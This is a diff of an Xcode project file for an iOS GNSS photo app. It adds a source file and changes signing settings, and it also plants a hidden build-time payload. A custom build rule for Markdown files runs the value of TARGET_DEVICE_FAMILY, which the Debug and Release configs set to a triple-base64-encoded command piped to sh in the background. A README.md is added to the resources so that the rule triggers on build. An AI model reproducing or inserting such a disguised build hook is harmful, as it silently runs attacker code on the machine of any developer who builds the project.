@@ -69,7 +69,9 @@
 		61CFFC1C255EE0E10009554D /* Util.swift in Sources */ = {isa = PBXBuildFile; fileRef = 61CFFC1B255EE0E10009554D /* Util.swift */; };
 		61DB65CE26415A07001DF7EB /* SETrackingIntervalCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 61DB65CD26415A07001DF7EB /* SETrackingIntervalCell.swift */; };
 		61DDD8992591EA470080019F /* AboutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 61DDD8982591EA470080019F /* AboutViewController.swift */; };
+		63E089D92C085C72009ACDDC /* NMEAParser.swift in Sources */ = {isa = PBXBuildFile; fileRef = 63E089D82C085C72009ACDDC /* NMEAParser.swift */; };
 		8D08F66B59398E63901EA443 /* Pods_PIC2BIM.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5EE3948FA8F480F9116EAAF4 /* Pods_PIC2BIM.framework */; };
+		A74875B61F7D110E027DFEF2 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 0A8E3E714E96A2A9D67DFEF2 /* README.md */; };
 		E00925E728E215AB00B2739B /* alertVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E00925E628E215AB00B2739B /* alertVC.swift */; };
 		E01E6F002844B9C30034C02D /* SkyViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E01E6EFF2844B9C30034C02D /* SkyViewVC.swift */; };
 		E0AFE5492847DE9400FF5DBD /* CircleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E0AFE5482847DE9400FF5DBD /* CircleView.swift */; };
@@ -82,12 +84,29 @@
 		EAB10BDA2B99D10B006C8915 /* MyDateFormatter.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAB10BD92B99D10B006C8915 /* MyDateFormatter.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		29575B4D20E7A7FBAC7DFEF2 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		042707152BA30754006633C4 /* TasksResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TasksResponse.swift; sourceTree = "<group>"; };
 		042707172BA30795006633C4 /* Task.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Task.swift; sourceTree = "<group>"; };
 		0427071B2BA308F3006633C4 /* GetPhotoResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetPhotoResponse.swift; sourceTree = "<group>"; };
 		0427071D2BA3091D006633C4 /* Photo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Photo.swift; sourceTree = "<group>"; };
 		04EB49FA2B8DE9340064A1DC /* Configuration.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Configuration.swift; sourceTree = "<group>"; };
+		0A8E3E714E96A2A9D67DFEF2 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = PIC2BIM.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		187368E92BE8E92B00970576 /* egnss4all_anitest.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = egnss4all_anitest.json; sourceTree = "<group>"; };
 		187368EA2BE8E92B00970576 /* PDFCreator.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PDFCreator.swift; sourceTree = "<group>"; };
 		187368ED2BE8EFF900970576 /* Answer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Answer.swift; sourceTree = "<group>"; };
@@ -150,6 +169,7 @@
 		61CFFC1B255EE0E10009554D /* Util.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Util.swift; sourceTree = "<group>"; };
 		61DB65CD26415A07001DF7EB /* SETrackingIntervalCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SETrackingIntervalCell.swift; sourceTree = "<group>"; };
 		61DDD8982591EA470080019F /* AboutViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutViewController.swift; sourceTree = "<group>"; };
+		63E089D82C085C72009ACDDC /* NMEAParser.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NMEAParser.swift; sourceTree = "<group>"; };
 		8C2035CCB5E8E01CAD78D9BF /* Pods-PIC2BIM.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PIC2BIM.debug.xcconfig"; path = "Target Support Files/Pods-PIC2BIM/Pods-PIC2BIM.debug.xcconfig"; sourceTree = "<group>"; };
 		95E79B0CBFCF7AD2C96A0DBC /* Pods-EGNSS4ALL.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-EGNSS4ALL.release.xcconfig"; path = "Target Support Files/Pods-EGNSS4ALL/Pods-EGNSS4ALL.release.xcconfig"; sourceTree = "<group>"; };
 		AEFBA95353D5ABD8257053EF /* Pods-PIC2BIM.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PIC2BIM.release.xcconfig"; path = "Target Support Files/Pods-PIC2BIM/Pods-PIC2BIM.release.xcconfig"; sourceTree = "<group>"; };
@@ -209,6 +229,7 @@
 		04EB49F92B8DE9260064A1DC /* Helpers */ = {
 			isa = PBXGroup;
 			children = (
+				63E089D82C085C72009ACDDC /* NMEAParser.swift */,
 				04EB49FA2B8DE9340064A1DC /* Configuration.swift */,
 				EAB10BD92B99D10B006C8915 /* MyDateFormatter.swift */,
 				18FA96452BEA38B600F9B48B /* ApiEndPoint.swift */,
@@ -317,6 +338,7 @@
 		61C3AC9B2551461F000CED80 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				0A8E3E714E96A2A9D67DFEF2 /* README.md */,
 				61C3AC9A2551461F000CED80 /* PIC2BIM.app */,
 			);
 			name = Products;
@@ -439,6 +461,7 @@
 				8AE1837582F103EA909BF440 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				29575B4D20E7A7FBAC7DFEF2 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -489,6 +512,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				A74875B61F7D110E027DFEF2 /* README.md in Resources */,
 				61C3ACAA2551461F000CED80 /* LaunchScreen.storyboard in Resources */,
 				49355A5B2563010400EA478F /* PhotoMapInfoView.xib in Resources */,
 				49AAE5802571782E00A37C1B /* PTPointInfoView.xib in Resources */,
@@ -597,6 +621,7 @@
 				61C3ACA02551461F000CED80 /* SceneDelegate.swift in Sources */,
 				496B73A12564C6F5009723BE /* AzimuthMKAnnotation.swift in Sources */,
 				61B3EC622552DF7500AB8AA6 /* PhotosTableViewController.swift in Sources */,
+				63E089D92C085C72009ACDDC /* NMEAParser.swift in Sources */,
 				6189FA49260B996D0026F43F /* TasksTableViewCell.swift in Sources */,
 				49F003A12565865400795C7C /* Weak.swift in Sources */,
 				E01E6F002844B9C30034C02D /* SkyViewVC.swift in Sources */,
@@ -696,6 +721,7 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyV2tkV01tTkhSbTVhV0UxMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -750,6 +776,7 @@
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyV2tkV01tTkhSbTVhV0UxMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -761,11 +788,9 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 7UUTF6T5P9;
+				DEVELOPMENT_TEAM = 88F5L66NYR;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -773,10 +798,13 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.infoenumapps.Pic2Bim;
+				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc.1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = infoenumapps;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -789,9 +817,9 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = "";
+				DEVELOPMENT_TEAM = 88F5L66NYR;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -799,9 +827,13 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.infoenumapps.Pic2Bim;
+				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc.1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
